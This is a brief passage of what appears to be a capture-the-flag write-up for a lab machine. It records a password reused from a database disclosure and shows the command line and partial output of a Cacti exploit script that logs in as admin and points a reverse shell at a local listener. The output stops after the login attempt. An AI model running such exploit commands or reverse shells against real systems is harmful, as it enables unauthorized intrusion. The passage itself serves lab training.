# Credentials
Password found on Mysql Disclosure works to login.
...
```bash
python3 cacti.py -t http://cacti-admin.monitors.htb -u admin -p 'BestAdministrator@2020!' --lhost 10.10.14.9 --lport 4444                                                                                                          2 ⨯
[+] Connecting to the server...
[+] Retrieving CSRF token...
[+] Got CSRF token: sid:f8660ed7cdd7251dfc51622eb5644e54f48fec01,1622999789
[+] Trying to log in...
